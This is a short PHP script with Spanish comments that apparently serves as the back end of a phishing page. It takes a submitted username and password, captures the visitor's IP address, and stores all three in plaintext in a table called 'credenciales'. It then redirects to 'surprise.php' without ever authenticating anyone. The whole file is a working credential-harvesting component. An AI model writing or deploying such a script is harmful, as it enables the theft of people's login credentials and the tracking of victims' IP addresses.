<?php
require_once "conexion.php";

// Verifica conexión
if (mysqli_connect_errno()) {
    echo "Error de conexión: " . mysqli_connect_error();
    exit();
}

// Obtener datos del formulario y la IP del usuario
$usuario = $_POST['usuario'];
$contraseña = $_POST['contraseña'];
$ip = $_SERVER['REMOTE_ADDR']; // Captura la IP del cliente

// Preparar la consulta para evitar SQLi
$stmt = $conex->prepare("INSERT INTO credenciales (usuario, contraseña, ip) VALUES (?, ?, ?)");
$stmt->bind_param("sss", $usuario, $contraseña, $ip);

// Ejecutar y cerrar
$stmt->execute();
$stmt->close();
$conex->close();

// Redirigir
header("Location: surprise.php");
exit();
?>
